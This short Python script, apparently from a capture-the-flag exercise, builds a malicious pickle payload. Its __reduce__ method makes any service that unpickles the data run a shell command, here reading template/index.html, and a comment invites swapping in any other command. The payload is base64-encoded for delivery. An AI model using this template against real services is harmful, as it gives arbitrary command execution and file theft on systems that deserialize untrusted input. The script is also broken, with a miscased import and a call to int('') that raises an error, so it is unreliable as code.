import pickle
import base64
import subprocess
from Crypto.util.number import long_to_bytes
class Exploit(object):
    def __reduce__(self):
        # Command with arguments as a list of strings
        cmd = ['cat', 'template/index.html']  # Replace with your command
        return (subprocess.check_output, (cmd,))
    
exploit = Exploit()
pickled = pickle.dumps(exploit)
encoded = base64.b64encode(pickled)
print(long_to_bytes(int('')))
print(encoded)
